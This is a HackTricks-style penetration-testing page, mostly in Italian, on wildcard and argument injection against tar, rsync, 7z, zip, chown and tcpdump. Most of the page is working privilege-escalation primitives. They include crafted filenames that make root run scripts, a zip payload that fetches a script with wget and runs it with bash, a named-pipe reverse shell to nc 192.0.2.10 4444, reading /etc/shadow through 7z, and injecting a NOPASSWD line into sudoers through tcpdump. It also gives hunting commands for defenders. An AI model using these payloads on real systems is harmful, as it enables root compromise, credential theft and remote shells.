# Wildcards Spare Tricks

{{#include ../../banners/hacktricks-training.md}}

> L'**argument injection** tramite wildcard (aka *glob*) avviene quando uno script privilegiato esegue un binario Unix come `tar`, `chown`, `rsync`, `zip`, `7z`, … con una wildcard non quotata come `*`.
> Poiché la shell espande la wildcard **prima** di eseguire il binario, un attacker che può creare file nella working directory può costruire filename che iniziano con `-` così che vengano interpretati come **options invece che come data**, di fatto introducendo flag arbitrari o persino comandi.
> Questa pagina raccoglie i primitive più utili, la ricerca recente e le moderne detections per il 2023-2025.

## chown / chmod

Puoi **copiare il owner/group o i permission bits di un file arbitrario** abusando del flag `--reference`:
```bash
# attacker-controlled directory
touch "--reference=/root/secret``file"   # ← filename becomes an argument
```
Quando root esegue in seguito qualcosa come:
```bash
chown -R alice:alice *.php
chmod -R 644 *.php
```
`--reference=/root/secret``file` viene iniettato, causando che *tutti* i file corrispondenti ereditino ownership/permissions di `/root/secret``file`.

*PoC & tool*: [`wildpwn`](https://github.com/localh0t/wildpwn) (combined attack).
Vedi anche il classico paper DefenseCode per i dettagli.

---

## tar

### GNU tar (Linux, *BSD, busybox-full)

Esegui comandi arbitrari abusando della funzionalità **checkpoint**:
```bash
# attacker-controlled directory
echo 'echo pwned > /tmp/pwn' > shell.sh
chmod +x shell.sh
touch "--checkpoint=1"
touch "--checkpoint-action=exec=sh shell.sh"
```
Una volta che root esegue ad esempio `tar -czf /root/backup.tgz *`, `shell.sh` viene eseguito come root.

### bsdtar / macOS 14+

Il `tar` predefinito sulle versioni recenti di macOS (basato su `libarchive`) non implementa `--checkpoint`, ma puoi comunque ottenere code-execution con il flag **--use-compress-program** che permette di specificare un compressore esterno.
```bash
# macOS example
touch "--use-compress-program=/bin/sh"
```
Quando uno script privilegiato esegue `tar -cf backup.tar *`, verrà avviato `/bin/sh`.

---

## rsync

`rsync` consente di sovrascrivere la remote shell o persino il binary remoto tramite flag da riga di comando che iniziano con `-e` o `--rsync-path`:
```bash
# attacker-controlled directory
touch "-e sh shell.sh"        # -e <cmd> => use <cmd> instead of ssh
```
Se root in seguito archivia la directory con `rsync -az * backup:/srv/`, il flag iniettato avvia la tua shell sul lato remoto.

*PoC*: [`wildpwn`](https://github.com/localh0t/wildpwn) (`rsync` mode).

---

## 7-Zip / 7z / 7za

Anche quando lo script privilegiato prefissa *difensivamente* il wildcard con `--` (per fermare il parsing delle opzioni), il formato 7-Zip supporta **file list files** prefissando il nome del file con `@`. Combinandolo con un symlink puoi *exfiltrate arbitrary files*:
```bash
# directory writable by low-priv user
cd /path/controlled
ln -s /etc/shadow   root.txt      # file we want to read
touch @root.txt                  # tells 7z to use root.txt as file list
```
Se root esegue qualcosa del tipo:
```bash
7za a /backup/`date +%F`.7z -t7z -snl -- *
```
7-Zip tenterà di leggere `root.txt` (→ `/etc/shadow`) come una lista di file e si fermerà, **stampando il contenuto su stderr**.

Questo sopravvive a `-- *` perché la CLI di 7-Zip accetta esplicitamente sia i normali filename sia `@listfiles` come input posizionali, quindi un filename letterale come `@root.txt` viene comunque trattato in modo speciale.

---

## zip

Esistono due primitive molto pratiche quando un'applicazione passa filename controllati dall'utente a `zip` (sia tramite un wildcard sia enumerando i nomi senza `--`).

- RCE tramite test hook: `-T` abilita “test archive” e `-TT <cmd>` sostituisce il tester con un programma arbitrario (forma estesa: `--unzip-command <cmd>`). Se riesci a iniettare filename che iniziano con `-`, separa le flag tra filename distinti in modo che il parsing delle short-options funzioni:
```bash
# Attacker-controlled filenames (e.g., in an upload directory)
# 1) A file literally named: -T
# 2) A file named: -TT wget 10.10.14.17 -O s.sh; bash s.sh; echo x
# 3) Any benign file to include (e.g., data.pcap)
# When the privileged code runs: zip out.zip <files...>
# zip will execute: wget 10.10.14.17 -O s.sh; bash s.sh; echo x
```
Note
- NON provare un singolo filename come `'-T -TT <cmd>'` — le opzioni brevi vengono analizzate carattere per carattere e fallirà. Usa token separati come mostrato.
- Se gli slash vengono rimossi dai filename dall'app, scarica da un host/IP nudo (path predefinito `/index.html`) e salva in locale con `-O`, poi esegui.
- Puoi fare debug del parsing con `-sc` (mostra argv processato) o `-h2` (più aiuto) per capire come vengono consumati i tuoi token.

Esempio (comportamento locale su zip 3.0):
```bash
zip test.zip -T '-TT wget 10.10.14.17/shell.sh' test.pcap    # fails to parse
zip test.zip -T '-TT wget 10.10.14.17 -O s.sh; bash s.sh' test.pcap  # runs wget + bash
```
- Data exfil/leak: Se il layer web fa eco di `zip` stdout/stderr (comune con wrapper ingenui), flag iniettati come `--help` o errori dovuti a opzioni errate compariranno nella HTTP response, confermando la command-line injection e aiutando il tuning del payload.

---

## Additional binaries vulnerable to wildcard injection (2023-2025 quick list)

I seguenti comandi sono stati abusati in CTF moderne e ambienti reali. Il payload è sempre creato come un *filename* dentro una directory scrivibile che verrà poi processata con un wildcard:

| Binary | Flag to abuse | Effect |
| --- | --- | --- |
| `bsdtar` | `--newer-mtime=@<epoch>` → arbitrary `@file` | Read file contents |
| `flock` | `-c <cmd>` | Execute command |
| `git`   | `-c core.sshCommand=<cmd>` | Command execution via git over SSH |
| `scp`   | `-S <cmd>` | Spawn arbitrary program instead of ssh |

Questi primitive sono meno comuni dei classici *tar/rsync/zip* ma vale la pena controllarli quando si fa hunting.

---

## Hunting vulnerable wrappers and jobs

Recent case studies hanno mostrato che wildcard/argv injection non è più solo un problema di **cron + tar**. La stessa classe di bug continua a comparire in:

- funzioni web che "download everything as zip/tar" da directory di upload controllate dall'attaccante
- debug shell di vendor/appliance che espongono un wrapper **tcpdump** con campi filename/filter controllati dall'attaccante
- job di backup o rotazione che chiamano `tar`, `rsync`, `7z`, `zip`, `chown`, o `chmod` su directory scrivibili

Useful triage commands:
```bash
# Hunt for interesting binaries fed with globs or positional user data
rg -n --hidden --follow \
'(tar|bsdtar|rsync|zip|7z|7za|chown|chmod|tcpdump).*(\*|\$@|\$\*)' \
/etc /opt /usr/local /srv 2>/dev/null

# Watch real argv during cron/systemd execution
pspy64 -pf -i 1000 | rg 'tar|rsync|zip|7z|tcpdump|chown|chmod'

# Sudoers rules that constrain one argument but still allow extra flags
sudo -l
rg -n 'tcpdump|zip|tar|rsync' /etc/sudoers /etc/sudoers.d 2>/dev/null
```
Quick heuristics:

- `-- *` è una buona fix per molti GNU tools, ma **non** per `7z`/`7za` perché `@listfiles` vengono parsati separatamente.
- Per `zip`, cerca wrapper che enumerano direttamente filenames controllabili dall'utente; il short-option splitting (`-T` + `-TT <cmd>`) funziona ancora anche senza un shell glob.
- Per `tcpdump`, presta particolare attenzione ai wrapper che ti permettono di controllare **output file names**, **rotation settings**, o argomenti di **capture-file replay**.

---

## tcpdump rotation hooks (-G/-W/-z): RCE via argv injection in wrappers

Quando una restricted shell o un vendor wrapper costruisce una `tcpdump` command line concatenando campi controllati dall'utente (per esempio un parametro "file name") senza quoting/validation rigorosi, puoi infilare flag extra di `tcpdump`. La combinazione di `-G` (time-based rotation), `-W` (limit number of files), e `-z <cmd>` (post-rotate command) consente arbitrary command execution come l'utente che esegue tcpdump (spesso root su appliances).

Precondizioni:

- Puoi influenzare `argv` passato a `tcpdump` (per esempio tramite un wrapper come `/debug/tcpdump --filter=... --file-name=<HERE>`).
- Il wrapper non sanitizza spazi o token prefissati da `-` nel campo file name.

Classic PoC (esegue uno reverse shell script da un path scrivibile):
```sh
# Reverse shell payload saved on the device (e.g., USB, tmpfs)
cat > /mnt/disk1_1/rce.sh <<'EOF'
#!/bin/sh
rm -f /tmp/f; mknod /tmp/f p; cat /tmp/f|/bin/sh -i 2>&1|nc 192.0.2.10 4444 >/tmp/f
EOF
chmod +x /mnt/disk1_1/rce.sh

# Inject additional tcpdump flags via the unsafe "file name" field
/debug/tcpdump --filter="udp port 1234" \
--file-name="test -i any -W 1 -G 1 -z /mnt/disk1_1/rce.sh"

# On the attacker host
nc -6 -lvnp 4444 &
# Then send any packet that matches the BPF to force a rotation
printf x | nc -u -6 [victim_ipv6] 1234
```
Dettagli:

- `-G 1 -W 1` forza una rotazione immediata dopo il primo packet che corrisponde.
- `-z <cmd>` esegue il post-rotate command una volta per rotazione. Molte build eseguono `<cmd> <savefile>`. Se `<cmd>` è uno script/interpreter, assicurati che la gestione degli argomenti corrisponda al tuo payload.

Varianti senza removable-media:

- Se hai qualsiasi altra primitive per scrivere file (ad es. un separato command wrapper che consente output redirection), metti il tuo script in un path noto e attiva `-z /bin/sh /path/script.sh` oppure `-z /path/script.sh` a seconda della semantica della piattaforma.
- Alcuni vendor wrappers ruotano verso location controllabili dall'attaccante. Se puoi influenzare il rotated path (symlink/directory traversal), puoi indirizzare `-z` a eseguire contenuto che controlli بالكامل senza external media.

---

## sudoers: tcpdump con wildcards/additional args → arbitrary write/read e root

Anti-pattern molto comune in sudoers:
```text
(ALL : ALL) NOPASSWD: /usr/bin/tcpdump -c10 -w/var/cache/captures/*/<GUID-PATTERN> -F/var/cache/captures/filter.<GUID-PATTERN>
```
Problemi
- Il glob `*` e i pattern permissivi limitano solo il primo argomento `-w`. `tcpdump` accetta più opzioni `-w`; vince l’ultima.
- La regola non fissa altre opzioni, quindi `-Z`, `-r`, `-V`, ecc. sono consentite.

Primitive
- Sovrascrivi il path di destinazione con un secondo `-w` (il primo serve solo a soddisfare sudoers):
```bash
sudo tcpdump -c10 -w/var/cache/captures/a/ \
-w /dev/shm/out.pcap \
-F /var/cache/captures/filter.aaaaaaaa-aaaa-aaaa-aaaa-aaaaaaaaaaaa
```
- Path traversal all'interno del primo `-w` per uscire dall'albero vincolato:
```bash
sudo tcpdump -c10 \
-w/var/cache/captures/a/../../../../dev/shm/out \
-F/var/cache/captures/filter.aaaaaaaa-aaaa-aaaa-aaaa-aaaaaaaaaaaa
```
- Forza la proprietà dell'output con `-Z root` (crea file di proprietà di root ovunque):
```bash
sudo tcpdump -c10 -w/var/cache/captures/a/ -Z root \
-w /dev/shm/root-owned \
-F /var/cache/captures/filter.aaaaaaaa-aaaa-aaaa-aaaa-aaaaaaaaaaaa
```
- Arbitrary-content scrittura riproducendo un PCAP crafted tramite `-r` (ad esempio, per inserire una riga sudoers):

<details>
<summary>Crea un PCAP che contenga l’esatto payload ASCII e scrivilo come root</summary>
```bash
# On attacker box: craft a UDP packet stream that carries the target line
printf '\n\nfritz ALL=(ALL:ALL) NOPASSWD: ALL\n' > sudoers
sudo tcpdump -w sudoers.pcap -c10 -i lo -A udp port 9001 &
cat sudoers | nc -u 127.0.0.1 9001; kill %1

# On victim (sudoers rule allows tcpdump as above)
sudo tcpdump -c10 -w/var/cache/captures/a/ -Z root \
-r sudoers.pcap -w /etc/sudoers.d/1111-aaaa \
-F /var/cache/captures/filter.aaaaaaaa-aaaa-aaaa-aaaa-aaaaaaaaaaaa
```
</details>

- Lettura arbitraria di file/secret leak con `-V <file>` (interpreta una lista di savefiles). Le diagnostiche di errore spesso ripetono le righe, facendo leak del contenuto:
```bash
sudo tcpdump -c10 -w/var/cache/captures/a/ -V /root/root.txt \
-w /tmp/dummy \
-F /var/cache/captures/filter.aaaaaaaa-aaaa-aaaa-aaaa-aaaaaaaaaaaa
```
---

## References

- [GTFOBins - tcpdump](https://gtfobins.github.io/gtfobins/tcpdump/)
- [GTFOBins - zip](https://gtfobins.github.io/gtfobins/zip/)
- [0xdf - HTB Dump: Zip arg injection to RCE + tcpdump sudo misconfig privesc](https://0xdf.gitlab.io/2025/11/04/htb-dump.html)
- [FiberGateway GR241AG - Full Exploit Chain](https://r0ny.net/FiberGateway-GR241AG-Full-Exploit-Chain/)
- [Elastic - Potential Shell via Wildcard Injection Detected](https://www.elastic.co/guide/en/security/current/prebuilt-rule-8-19-20-potential-shell-via-wildcard-injection-detected.html)

{{#include ../../banners/hacktricks-training.md}}
